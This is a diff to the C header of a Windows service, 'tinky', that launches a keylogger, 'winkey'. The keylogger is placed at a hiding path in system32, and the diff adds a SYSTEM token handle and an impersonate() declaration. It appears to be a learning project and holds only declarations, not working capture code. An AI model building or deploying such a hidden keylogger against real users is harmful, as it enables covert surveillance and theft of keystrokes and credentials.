@@ -10,10 +10,10 @@
 //#include "unicode.h"
 
 // =============== Magic variables ========== //
-#define WINKEY_STOP "Global\\stop_winkey_process"  // NameSpace Global ?
-#define SVC_NAME "tinky"
-#define KYLG_NAME "winkey"
-#define HIDING_PATH "C:\\Windows\\system32\\winkey.exe"
+#define WINKEY_STOP TEXT("Global\\stop_winkey_process")  // NameSpace Global ?
+#define SVC_NAME TEXT("tinky")
+#define KYLG_NAME TEXT("winkey")
+#define HIDING_PATH TEXT("C:\\Windows\\system32\\winkey.exe")
 // global {
 #define NO_ARGS NULL
 #define NO_NAME NULL
@@ -37,6 +37,7 @@ typedef struct tinky {
 	// Global {
 	char	*winkeyExePath;
 	char	*tinkyExePath;
+	HANDLE	systemToken;
 	// }
 
 	// start {
@@ -44,7 +45,7 @@ typedef struct tinky {
 	SERVICE_STATUS_HANDLE	svcStatusHandle;
 	HANDLE					tinkyStopEventHandle;
 	HANDLE					winkeyStopEventHandle;
-	STARTUPINFOA			startupInfo;
+	STARTUPINFOW			startupInfo;
 	PROCESS_INFORMATION		processInfo;
 	// }
 }	tinky_t;
@@ -55,6 +56,8 @@ typedef struct tinky {
 BYTE initControl(void);
 // =============== service control managed =============== //
 int startedBySCM(void);
+// =============== impersonate.cpp =============== //
+void impersonate(void);
 // =============== install.cpp =============== //
 int openSCM(DWORD desiredAccess);
 int install(void);
